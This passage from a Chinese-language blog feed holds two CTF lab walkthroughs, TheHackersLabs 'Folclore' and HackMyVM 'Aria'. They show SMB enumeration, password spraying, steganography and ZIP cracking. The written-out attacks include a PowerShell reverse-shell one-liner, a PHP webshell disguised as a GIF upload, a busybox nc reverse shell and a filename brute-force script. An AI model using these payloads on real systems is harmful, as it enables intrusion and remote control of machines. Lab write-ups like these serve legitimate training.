FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo\n```\n\n但是并不能下载任何东西\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u anonymous -p '' -M spider_plus -o DOWNLOAD_FLAG=true\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\anonymous: (Guest)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] EXCLUDE_FILTER: ['print$', 'ipc$']\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]   EXCLUDE_EXTS: ['ico', 'lnk']\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares\nSMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark\nSMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------\nSMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota\nSMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado\nSMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.\nSMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota\nSMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.\nSMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno\nSMB         192.168.56.101  445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.\nSMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel\nSMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [+] Saved share-file metadata to \"/root/.nxc/modules/nxc_spider_plus/192.168.56.101.json\".\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Shares:           9 (ADMIN$, C$, Dia de Muertos, IPC$, Libertad, Lluvia, Oro, Santuario, Viento)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Readable Shares:  1 (IPC$)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total folders found:  0\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total files found:    0\n```\n\n但可以注意到描述中有东西\n\n```bash\nADMIN$                          Admin remota\nC$                              Recurso predeterminado\nDia de Muertos                  Al final, todos somos polvo y hueso.\nIPC$            READ            IPC remota\nLibertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.\nLluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno\nOro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.\nSantuario                       El Refugio de Ixchel\nViento                          El viento sagrado ejecutará la tarea a su debido tiempo\n```\n\n> ADMIN$ - 远程管理员\nC$ - 默认资源\n亡灵节 - 最终，我们都会化为尘土和白骨。\nIPC$ - 读取远程IPC\n自由 - 秘密在于那些敢于追寻的人；无所畏惧地追随你的道路。\n雨 - 请注意，在这幅图中，只有懂得聆听雷声的人才能找到道路。\n金  - 你想到达羽蛇神吗？你的道路从这里开始。\n圣所 - 伊克切尔的避难所\n风 - 神圣的风会在适当的时候完成任务。\n> \n\n### 用户枚举\n\n用户枚举，PS：之前一直卡在上边，因为没想到要通过暴力破解，因为我觉得会有密码最大阈值（\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u guest -p '' --rid-brute                      \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\guest: (Guest)\nSMB         192.168.56.101  445    FOLCLORE         500: FOLCLORE\\Administrador (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         501: FOLCLORE\\Invitado (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         503: FOLCLORE\\DefaultAccount (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         504: FOLCLORE\\WDAGUtilityAccount (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         513: FOLCLORE\\Ninguno (SidTypeGroup)\nSMB         192.168.56.101  445    FOLCLORE         1001: FOLCLORE\\Quetzalcoatl (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1003: FOLCLORE\\El_charro_negro (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1004: FOLCLORE\\Ix_Chel (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1005: FOLCLORE\\Tlaloc (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1006: FOLCLORE\\La_mulata_de_Cordoba (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1007: FOLCLORE\\La_Catrina (SidTypeUser)\n```\n\n使用得到的用户名进行密码爆破\n\n```bash\n➜  Folclore cat user.txt                                                        \nAdministrador\nInvitado\nDefaultAccount\nWDAGUtilityAccount\nNinguno\nQuetzalcoatl\nEl_charro_negro\nIx_Chel\nTlaloc\nLa_mulata_de_Cordoba\nLa_Catrina\n```\n\n经过需求尝试后，发现 `grep '[+]'` 无法匹配出来，因为账户密码过期了.. 需要匹配 `grep -v 'STATUS_LOGON_FAILURE'` \n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u user.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE' \nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [-] Folclore\\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED\n```\n\n为了继续操作，通过图形化界面对密码进行了修改\n\n![image.png](/post-images/TheHackersLabsFolclore/image1.png)\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u el_charro_negro -p abc1234                                                                                             \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\el_charro_negro:abc1234\n```\n\n## 图片隐写 - 1\n\n通过该用户枚举 `SMB`，能得到一张照片\n\n![image.png](/post-images/TheHackersLabsFolclore/image2.png)\n\n![image.png](/post-images/TheHackersLabsFolclore/image3.png)\n\n盲猜是图片隐写了\n\n```bash\n➜  Folclore binwalk -Me --run-as=root El_Charro_Negro.jpeg                              \n\nScan Time:     2025-09-24 17:32:08\nTarget File:   /root/Desktop/TheHackersLabs/Folclore/El_Charro_Negro.jpeg\nMD5 Checksum:  97f1dd191d3d9217ee0147f15a700c4f\nSignatures:    436\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\nWARNING: One or more files failed to extract: either no utility was \nfound or it's unimplemented\n\n➜  Folclore foremost El_Charro_Negro.jpeg   \nProcessing: El_Charro_Negro.jpeg\n|*|\n\n➜  Folclore exiftool El_Charro_Negro.jpeg \nExifTool Version Number         : 13.25\nFile Name                       : El_Charro_Negro.jpeg\nDirectory                       : .\nFile Size                       : 50 kB\nFile Modification Date/Time     : 2025:09:24 17:29:12+08:00\nFile Access Date/Time           : 2025:09:24 17:30:13+08:00\nFile Inode Change Date/Time     : 2025:09:24 17:29:12+08:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nExif Byte Order                 : Big-endian (Motorola, MM)\nY Cb Cr Positioning             : Centered\nCopyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK\nImage Width                     : 736\nImage Height                    : 981\nEncoding Process                : Progressive DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 736x981\nMegapixels                      : 0.722\n```\n\n得到一个提示：\n\n![image.png](/post-images/TheHackersLabsFolclore/image4.png)\n\n给出一个字符串 `4+9Ii1wK` ，估计是个密码\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u user.txt -p '4+9Ii1wK' --ignore-pw-decoding                                               \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Quetzalcoatl:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\El_charro_negro:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Ix_Chel:4+9Ii1wK STATUS_PASSWORD_EXPIRED \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Tlaloc:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_mulata_de_Cordoba:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_Catrina:4+9Ii1wK STATUS_LOGON_FAILURE\n```\n\n是 `Ix_Chel` 的密码，不过也过期了… 重复上边的操作\n\n## 图片隐写 - 2\n\n然后再次枚举 SMB\n\n![image.png](/post-images/TheHackersLabsFolclore/image5.png)\n\n得到一个 TXT 文件，又是一个凭据 `677Kn$q`\n\n```bash\n➜  Folclore cat La\\ clave\\ de\\ Kukulcán.txt           \nRecuerdo cuando conocí a Kukulcán, \nla serpiente emplumada que otros llaman Quetzalcóatl; \nsu mirada guardaba el misterio del viento y la sabiduría, \ny con una sonrisa me confió que su clave más preciada tenía solo ocho caracteres, \nsencilla pero poderosa, como él mismo. Nuestros caminos se entrelazan: \nyo, guardiana de la luna y la vida; é     l, \nportador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. \nAhora, sigue adelante, porque Quetzalcóatl te espera. \nContinua buscando a Tláloc,te despejare el camino entregá     \nndote su clave: 677Kn$q.\"\n```\n\n密码是用户 `Tlaloc`  的\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u Tlaloc -p '677Kn$q' --ignore-pw-decoding\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Tlaloc:677Kn$q STATUS_PASSWORD_EXPIRED \n```\n\n枚举 SMB\n\n![image.png](/post-images/TheHackersLabsFolclore/image6.png)\n\n照片 ++\n\n![image.png](/post-images/TheHackersLabsFolclore/image7.png)\n\n盲猜还是隐写，直接通过 `stegseek` 可以拿到文件\n\n```bash\n➜  Folclore stegseek Tlaloc.jpg \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"knight\"\n[i] Original filename: \"Las primeras señales.txt\".\n[i] Extracting to \"Tlaloc.jpg.out\".\n```\n\n凭证 ++\n\n```bash\n➜  Folclore cat Tlaloc.jpg.out \nHe conseguido estos últimos dos caracteres para la clave de Kukulcán, \nla serpiente emplumada que llaman Quetzalcóatl: \n%/. Te los entrego para que completes tu búsqueda. \nAdemás, aquí tienes otra clave, \naunque debo confesar que no recuerdo a quién pertenece exactamente: \n45yD#k7. Confí     a en tu instinto para usarla sabiamente.\n```\n\n## ZIP crack\n\n是用户 `La_mulata_de_Cordoba` 的凭据\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u La_mulata_de_Cordoba -p '45yD#k7'\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED\n```\n\n再枚举 `SMB` ，一个 txt 一个 ZIP\n\n![image.png](/post-images/TheHackersLabsFolclore/image8.png)\n\nTXT 得到一个账户 `La_Catrina:3nM93{S#`\n\n```bash\n➜  Folclore cat Mi_amiga.txt                                                   \nMi amiga ‘La Catrina’ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. \nEscribiré la clave aquí para no olvidarla: 3nM93{S#\n```\n\nZip 需要密码\n\n```bash\n➜  Folclore unzip Pacto.zip \nArchive:  Pacto.zip\n   skipping: Pacto.txt               need PK compat. v5.1 (can do v4.6)\n```\n\n通过 `John` 进行爆破\n\n```bash\n➜  Folclore zip2john Pacto.zip > hash\n➜  Folclore john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])\nCost 1 (HMAC size) is 238 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ncelina           (Pacto.zip/Pacto.txt)     \n1g 0:00:00:00 DONE (2025-09-24 18:26) 2.564g/s 42010p/s 42010c/s 42010C/s 123456..cocoliso\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\n`7z` 进行解压\n\n```bash\n➜  Folclore 7z x Pacto.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 432 bytes (1 KiB)\n\nExtracting archive: Pacto.zip\n--\nPath = Pacto.zip\nType = zip\nPhysical Size = 432\n\n    \nEnter password (will not be echoed):\nEverything is Ok\n\nSize:       358\nCompressed: 432\n```\n\n得到一个神秘字符串 `J9c`\n\n```bash\n➜  Folclore cat Pacto.txt \nHas surcado sendas que pocos se atreven a cruzar, \npero tu viaje no concluye todavía. Invocando mis artes prohibidas, \nlogré hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: \nsólo tres caracteres fui capaz de obtener. \nAhora los deposito en tus manos, \npero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.\n```\n\n我们检查一下上面得到的用户能做的事情，还是一个 `txt`\n\n![image.png](/post-images/TheHackersLabsFolclore/image9.png)\n\n```bash\n➜  Folclore cat Ultimo_mensaje.txt \nSolo puedo darte el quinto carácter de su clave: ‘U’. \nLos demás caracteres que faltan deberás encontrarlos por tu cuenta, \naunque no debe ser tan difícil; solo son números o letras. \nConfía en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.\n```\n\n## 密码爆破\n\n集合上边的得到几个`txt`，得到密码应该是 `J9c?U?%/`，第四个字母需要我们进行爆破\n\n```bash\n➜  Folclore for char1 in {a..z} {A..Z} {0..9}; do printf \"J9c%sU%s%%/\\n\" \"$char1\" \"$char1\"; done > wordlist.txt \n```\n\n得到凭据 `Quetzalcoatl:J9c7U7%/`\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u user.txt -p wordlist.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE'\nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Ninguno:J9caUa%/ (Guest)\nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Quetzalcoatl:J9c7U7%/\n```\n\nSMB 枚举…\n\n![image.png](/post-images/TheHackersLabsFolclore/image10.png)\n\n## xxxxx\n\n查看得到的  `txt`\n\n```bash\n➜  Folclore cat /root/.nxc/modules/nxc_spider_plus/192.168.56.101/Viento/Serpiente\\ Emplumada.txt \nHas recorrido con valentía y sabiduría un sendero lleno de retos; te felicito, guerrero del destino.\nAhora, confía en mí, Quetzalcóatl, la serpiente emplumada, pues seré yo quien te otorgue el acceso necesario. \nSolo ejecutaré una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. \nQue esta acción sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.# \n```\n\n表示我们可以上传 `Powershell` 文件一次\n\n![image.png](/post-images/TheHackersLabsFolclore/image11.png)\n\n将下面的代码保存为 `xxx.ps1` 然后进行上传\n\n```bash\n$client = New-Object Net.Sockets.TCPClient('192.168.56.5',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n```bash\nsmbclient //192.168.56.101/viento -U Quetzalcoatl%'J9c7U7%/'\nput shell.ps1\n```\n\n等待弹回来\n\n![image.png](/post-images/TheHackersLabsFolclore/image12.png)\n\n读取 `User.txt`\n\n```bash\nPS C:\\Users\\Quetzalcoatl\\Desktop> type User.txt\n456e20656c207669656e746f2079616365206c6120766572646164\n```\n\n为了方便操作迁移到 `msf` \n\n![image.png](/post-images/TheHackersLabsFolclore/image13.png)\n\n上来后通过 winpeas 等枚举了许多，但是没找到可以利用的\n\n最后可以在 `Downloads\\Actualizacion` 中找到管理员密码\n\n```bash\nC:\\Users\\Quetzalcoatl\\Downloads\\Actualizacion>type Venganza.txt\ntype Venganza.txt\nHe conseguido la clave del administrador!!!\nLa guardare para no olvidarla: xxxxxxxx\n```\n\n```bash\n➜  Folclore nxc smb 192.168.56.101 -u 'administrador' -p 'xxxxxx*'                        \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\administrador:xxxxxx (Pwn3d!)\n```\n\n拿 `root.txt` ，直接读就算了，懒得拿 `shell` 了\n\n![image.png](/post-images/TheHackersLabsFolclore/image14.png)\n\n## 总结\n\n体验不算好\n",
            "url": "https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore",
            "title": "TheHackersLabs - Folclore",
            "summary": "Folclore https://labs.TheHackersLabs.com/machine/123 Recon PortScan 仅仅两个端口 SMB 枚举 SMB 匿名枚举 但是并不能下载任何东西 但可以注意到描述中有东西 ADMIN$ 远程管理员 C$ 默认资源 亡灵节 最终，我们都会化为...",
            "date_modified": "2025-09-24T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "MISC"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/23/HackMyVMAria",
            "content_html": "\n# Aria.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Aria\n> \n\n![image.png](/post-images/HackMyVMAria/image.png)\n\n## Recon\n\n### 端口扫描\n\n```bash\n➜  Aria nmap -sT -min-rate 10000 -p- 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:23 CST\nNmap scan report for 192.168.56.214\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:9A:02:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.23 seconds\n```\n\n```bash\n➜  Aria nmap -sT -A -p 22,80,1337 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:25 CST\nNmap scan report for 192.168.56.214\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey:\n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ultra-Secure Naming Service\n|_http-server-header: Apache/2.4.62 (Debian)\n1337/tcp open  waste?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:\n|     --- Aria Debug Shell ---\n|     Type 'exit' to quit ---\n|   GenericLines:\n```\n\n### 80 端口\n\n给出了一点信息\n\n- 通过 `md5(time()·rand(1,1000))` ****生成不可预测的文件名\n- 并且文件内容不可包含 `<?php`\n- 以及文件名仅仅可以是 gif / jpg / png\n\n![image.png](/post-images/HackMyVMAria/image1.png)\n\n`<?php` 可以通过 `<?=` 来绕过，文件名可以通过 `GIF89a` ，但是不可预测文件名需要想办法\n\n### 1337 端口\n\n扫描出来很奇怪，`nc` 一下\n\n```\n➜Aria nc 192.168.56.214 1337\n--- Aria Debug Shell ---\n--- Type 'exit' to quit ---\n\n$ help\nThis shell aids admins in debugging Aria services.\nUse specific commands to view logs or hidden path.\nNote: Web interface also provides foothold access.\n```\n\n> 此 Shell 可帮助管理员调试 Aria 服务。\n使用特定命令查看日志或隐藏路径。\n注意：Web 界面也提供立足点访问权限。\n> \n\n大概是可以通过特定命令来查看日志或隐藏路径\n\n```bash\n$ path\nYou're close! Try a command related to revealing paths.\n$ path ls\nYou're close! Try a command related to revealing paths.\n$ path dir\nYou're close! Try a command related to revealing paths.\n$ path upload\nYou're close! Try a command related to revealing paths.\n$ path ls -al\nYou're close! Try a command related to revealing paths.\n$ path ls path\nYou're close! Try a command related to revealing paths.\n$ path ll\nYou're close! Try a command related to revealing paths.\n```\n\n想不到，再看看 `web` 端\n\n![image.png](/post-images/HackMyVMAria/image2.png)\n\n### 爆破\n\n受不了，直接跟它爆了\n\n![BOOM-4x (2).gif](/post-images/HackMyVMAria/BOOM-4x_(2).gif)\n\n```bash\nimport time\nimport hashlib\nimport requests\nfrom datetime import datetime\n\n# --- 配置区 ---\nTARGET_IP = '192.168.56.214'\nTARGET_PATH = '/uploads/'\nFILE_EXTENSION = '.gif'\nBASE_URL = f\"http://{TARGET_IP}{TARGET_PATH}\"\n\n# 时间范围（秒）。例如 10 表示从当前时间的前10秒到后10秒\nTIME_WINDOW_SECONDS = 10\n# 随机数范围\nRAND_MIN = 1\nRAND_MAX = 1000\n\n# --- 脚本核心逻辑 ---\n\ndef main():\n    \"\"\"主执行函数\"\"\"\n    # 计算起始和结束时间戳\n    current_time = int(time.time())\n    start_time = current_time - TIME_WINDOW_SECONDS\n    end_time = current_time + TIME_WINDOW_SECONDS\n\n    # 打印任务信息\n    print(\"=\" * 52)\n    print(\"开始爆破...\")\n    print(f\"目标主机: {BASE_URL}\")\n    print(\"成功条件: 响应状态码不为 404\")\n    print(f\"时间范围: {datetime.fromtimestamp(start_time)} -> {datetime.fromtimestamp(end_time)}\")\n    print(f\"随机数范围: {RAND_MIN} - {RAND_MAX}\")\n    total_attempts = (end_time - start_time + 1) * RAND_MAX\n    print(f\"预计总尝试次数: {total_attempts:,}\")\n    print(\"=\" * 52)\n\n    # 使用 requests.Session() 可以复用TCP连接，提高效率\n    session = requests.Session()\n    session.headers.update({\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n    }) # 添加一个常见的User-Agent，避免被一些简单的WAF拦截\n    \n    found = False\n    counter = 0\n\n    try:\n        # 外层循环遍历时间戳\n        for t in range(start_time, end_time + 1):\n            # 内层循环遍历随机数\n            for r in range(RAND_MIN, RAND_MAX + 1):\n                # 1. 生成原始字符串\n                original_string = f\"{t}{r}\"\n                \n                # 2. 计算 MD5 哈希\n                md5_hash = hashlib.md5(original_string.encode('utf-8')).hexdigest()\n                \n                # 3. 构造完整的 URL\n                url = f\"{BASE_URL}{md5_hash}{FILE_EXTENSION}\"\n                \n                # 实时显示进度\n                counter += 1\n                if counter % 500 == 0:\n                    print(f\"已尝试 {counter:,} 次, 当前时间戳: {t}    \", end='\\r')\n\n                try:\n                    # 4. 发送 HEAD 请求检查\n                    response = session.head(url, timeout=2, allow_redirects=True) # allow_redirects=True 可以跟随重定向\n                    \n                    # 5. 判断状态码 - 如果响应不是 404 Not Found，就认为是成功\n                    if response.status_code != 404:\n                        print(\"\\n\\n[+] 成功！发现一个非 404 响应！\")\n                        print(f\"[+] 状态码: {response.status_code}\") # 打印实际的状态码\n                        print(f\"[+] URL: {url}\")\n                        print(f\"[+] 生成源: 时间戳={t}, 随机数={r}\")\n                        found = True\n                        return # 找到后直接退出函数\n                        \n                except requests.exceptions.RequestException:\n                    continue\n\n    except KeyboardInterrupt:\n        print(\"\\n\\n[!] 用户手动中断了脚本。\")\n    finally:\n        print(\"\\n\" + \"=\" * 52)\n        if not found:\n            print(\"爆破完成，未找到有效文件。\")\n        print(\"脚本执行结束。\")\n        print(\"=\" * 52)\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n测试一下\n\n```bash\n------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=\"file\"; filename=\"nneo.gif\"\nContent-Type: image/gif\n\nGIF89a\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n```\n\n![image.png](/post-images/HackMyVMAria/image3.png)\n\n写马子\n\n```bash\n------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=\"file\"; filename=\"nneo.gif\"\nContent-Type: image/gif\n\nGIF89a\n<?= phpinfo();exec($_GET['x']); ?>\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n```\n\n通过马子弹个 `shell`\n\n```bash\n?x=busybox+nc+192.168.56.5+1234+-e+%2Fbin%2Fbash\n```\n\n![image.png](/post-images/HackMyVMAria/image4.png)\n\n可以拿到 `user.txt`\n\n```bash\ncat user.txt\nflag{user-d13adadc6bbc1391394a5198cba2d1d7}\n```\n\n## 提权\n\n### 信息收集\n\n首先拿到完整 shell （略）\n\n查看正在监听端口，发现本地开着 `6800`\n\n```bash\nwww-data@Aria:/$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   \nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      \ntcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*      \ntcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*      \ntcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      \ntcp     LISTEN   0        128                    *:80                  *:*      \ntcp     LISTEN   0        128                [::1]:6800             [::]:*      \ntcp     LISTEN   0        128                 [::]:22               [::]:* \n```\n\n通过 socat 转发出去\n\n```bash\nwww-data@Aria:/tmp$ ./socat TCP-LISTEN:6801,fork TCP4:127.0.0.1:6800 &\n[1] 25929\n```\n\n但貌似并不是 HTTP 服务，结合吧唧名称和搜索引擎，大致确定是 aria2 的 RPC 端口，应该能从上面拿到什么文件\n\n> Aria2 是一款自由、跨平台命令行界面的下载管理器，该软件根据 GPLv2 许可证进行分发\n> \n\n### Aria2 PRC - 1\n\n找到官方文档，测试一下 PRC 接口\n\n> https://aria2.github.io/manual/en/html/aria2c.html#terminology | https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket\n> \n\n测试，确实有回显\n\n```bash\n➜  Aria curl 192.168.56.116:6801/jsonrpc\n{\"id\":null,\"jsonrpc\":\"2.0\",\"error\":{\"code\":-32600,\"message\":\"Invalid Request.\"}}# \n```\n\n测试一下方法，发现需要认证\n\n> 要使用 RPC 方法级授权，用户必须使用 **`--rpc-secret`** 选项指定 RPC 秘密授权令牌\n> \n\n```bash\n➜  Aria curl '192.168.56.116:6801/jsonrpc?method=aria2.tellStatus&id=foo'                                   \n{\"id\":\"foo\",\"jsonrpc\":\"2.0\",\"error\":{\"code\":1,\"message\":\"Unauthorized\"}}# \n```\n\n### 零宽度字符\n\n所以现在的目标是要找到 `Token`\n\n最后发现 `user.txt` 不正常\n\n![image.png](/post-images/HackMyVMAria/image5.png)\n\n- **`E2 80 8B`**: 这是 UTF-8 编码下的 **零宽空格 (Zero-Width Space, ZWSP)**。它是一个在排版中用于在不断词的地方允许换行的字符，但它本身**完全不可见**，也不占据任何宽度。\n- **`E2 80 8C`**: 这是 UTF-8 编码下的 **零宽非连接符 (Zero-Width Non-Joiner, ZWNJ)**。它也是一个**完全不可见**的控制字符。\n\n这应该是零宽度字节隐写，通过在线工具进行解密，通过搜索引擎搜索：Zero-Width Space Steganography 能找到可用的在线工具，尝试了很多个，最后这个能用\n\n> https://stegzero.com/\n> \n\n![image.png](/post-images/HackMyVMAria/image6.png)\n\n得到 